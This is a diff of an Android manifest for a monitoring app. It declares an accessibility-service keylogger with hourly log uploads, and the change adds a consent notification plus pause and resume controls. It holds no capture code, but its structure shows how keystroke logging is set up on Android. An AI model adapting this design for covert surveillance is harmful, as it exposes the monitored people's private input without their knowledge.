@@ -5,6 +5,9 @@
   <!-- The hourly upload runs from an alarm broadcast and must finish even if
        the screen is off, so it holds a short partial wake lock. -->
   <uses-permission android:name="android.permission.WAKE_LOCK"/>
+  <!-- Monitoring is never silent: the ongoing notification is the consent
+       indicator, so the app needs permission to post it on API 33+. -->
+  <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
 
   <!-- API 30+ package visibility: without this, getApplicationInfo() throws for
        almost every app, so log lines show raw package names instead of labels. -->
@@ -32,7 +35,10 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-        <service android:name=".Keylogger"
+        <activity
+            android:name=".SettingsActivity"
+            android:exported="false" />
+        <service android:name=".KeyloggerService"
             android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:label="@string/accessibility_service_label">
@@ -46,6 +52,10 @@
         <!-- Alarm target. Not exported: only our own PendingIntent fires it. -->
         <receiver
             android:name=".UploadReceiver"
+            android:exported="false"/>
+        <!-- Pause/resume actions on the ongoing monitoring notification. -->
+        <receiver
+            android:name=".ControlReceiver"
             android:exported="false"/>
     </application>
 
